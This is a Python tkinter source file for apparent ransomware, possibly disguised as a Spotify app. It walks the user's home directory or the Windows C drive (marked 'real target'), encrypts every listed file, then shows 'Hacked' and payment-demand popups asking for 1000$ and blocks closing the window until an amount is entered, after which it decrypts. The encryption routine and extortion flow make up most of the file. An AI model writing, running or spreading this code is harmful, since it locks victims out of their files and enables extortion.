from tkinter import messagebox, Toplevel, Button, Label, Entry, StringVar, ttk
import os
import threading
import platform
import time
from encrypt import encrypt_file
from decrypt import decrypt_file
DO_NOT_ENCRYPT = ["file_lists.txt", "encrypt.py", "decrypt.py", "get_encrypt_files.py", "get_decrypt_files.py","App.py",".venv"]
def open_input_popup(window):
    """Function to open a popup window with a condition to close."""
    # Create the popup window
    popup = Toplevel()
    popup.title("Input Popup")  # Title of the popup
    popup.geometry("350x200")  # Set popup size
    popup.resizable(False, False)  # Disable resizing
    popup.attributes("-topmost", True)  # Keep popup on top
    popup.configure(bg="#f0f0f0")  # Light gray background for a cleaner UI
    
    # Disable the 'X' button (close button)
    popup.protocol("WM_DELETE_WINDOW", lambda: messagebox.showwarning("Action Blocked", "Complete the condition to close!"))

    # Add a label
    Label(popup, text="Enter '1000' or more to close:", font=("Arial", 12), bg="#f0f0f0").pack(pady=10)

    # Add an Entry widget for input
    input_var = StringVar()  # Use StringVar to manage the input
    input_field = Entry(popup, font=("Arial", 12), textvariable=input_var, width=25, justify="center")
    input_field.pack(pady=5)

    # Function to check the condition and close the popup
    def check_condition():
        try:
            user_input = int(input_var.get().strip())  # Ensure input is an integer
            if user_input >= 1000:  # Check if the input is 1000 or more
                popup.destroy()  # Close the popup
                 # Show loading simulation√πpath.dirname(os.path.abspath(__file__))
                show_loading_popup(window)

                 # Close the main window after decryption
            else:
                messagebox.showerror("Invalid Input", "Enter at least 1000$ to get your files back.")  # Error for invalid input
        except ValueError:
            messagebox.showerror("Invalid Input", "Please enter a valid number.")  # Error for non-numeric input
    
    # Add a Submit button
    b=Button(popup, text="Submit", command=check_condition , font=("Arial", 10), bg="#4CAF50", fg="white", activebackground="#45a049").pack(pady=10)

    
    # Restore default close behavior
    # Make the popup modal (block interaction with main window)
    popup.grab_set()
    

log_file = "file_lists.txt"  # Log file to store all files in the target directory

def walk_files(target,window):
    """Function to walk through files and log them."""
    try:
        with open(log_file, "w",encoding="utf-8", errors="ignore") as f:
            for root, dirs, files in os.walk(target):
                if not "spotify-malware" in root:
                    for file in files:
                        
                        try:
                            f.write(os.path.join(root, file) + "\n")
                            
                        except Exception as e:
                            print(f"Error processing file {file}: {e}")
                            
                
        time.sleep(2)  # Simulate processing time         
        encrypt_all_files()  # Encrypt all files listed in the log file
        
        # Notify the user about encryption and payment
        messagebox.showwarning("Hacked", "All files have been encrypted. Pay 1000$ to get your files back.")
        messagebox.showwarning("Payment", "Send 1000$ to 1234567890, then you'll find the button to decrypt your files.")
        open_input_popup(window)


    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {e}")  # Show error if something goes wrong


def encrypt_all_files():
    """Encrypt all files listed in the log file."""
    with open(log_file, "r") as f:
        for line in f:
            print(line)  
            try:# Debug: print file being encrypted
                encrypt_file(line.strip())  # Call encrypt function on each file
            except Exception as e:
                print(f"Error encrypting file: {e}")
def show_loading_popup(window):
    """Show a loading popup to simulate processing and stop dynamically."""
    loading_popup = Toplevel()
    loading_popup.title("Processing")  # Title of the loading popup
    loading_popup.geometry("300x100")  # Set popup size
    loading_popup.resizable(False, False)
    loading_popup.attributes("-topmost", True)  # Keep popup on top
    loading_popup.configure(bg="#f0f0f0")

    # Add a label to indicate processing
    Label(loading_popup, text="Decrypting files...", font=("Arial", 12), bg="#f0f0f0").pack(pady=20)

    # Add a progress bar for visual effect
    progress = ttk.Progressbar(loading_popup, length=250, mode="indeterminate")
    progress.pack(pady=5)
    progress.start()  # Start the progress bar animation

    # Start the decryption process in a separate thread
    thread = threading.Thread(target=decrypt_all_files, args=(progress, loading_popup,window))
    thread.daemon = True
    thread.start()

    loading_popup.grab_set()
    

def decrypt_all_files(progress, loading_popup,window):
    """Decrypt all files listed in the log file and stop progress bar when done."""
    try:
        with open("file_lists.txt", "r") as f:
            for line in f:
                try:
                    decrypt_file(line.strip())
                    # Call decrypt function on each file
                except Exception as e:
                    print(f"Error decrypting file: {e}")
        # Stop the progress bar and close the popup after decryption completes
        progress.stop()
        loading_popup.destroy()
        window.destroy()

    except Exception as e:
        progress.stop()
        loading_popup.destroy()
        messagebox.showerror("Error", f"An error occurred during decryption: {e}")

def target_name():
    os_name=platform.system()  
    if os_name=="windows":
        return "C:\\"
    else:
        return os.path.expanduser("~")
def start_file_walk_in_background(window):
    """Start file walking in a separate thread."""
    target = "."  # For testing purposes, walk the current directory
    target = target_name() ############real target
    thread = threading.Thread(target=walk_files, args=(target,window,))
    thread.daemon = True  # Ensure the thread exits when the main program exits
    thread.start()
     # Close the main window after starting the thread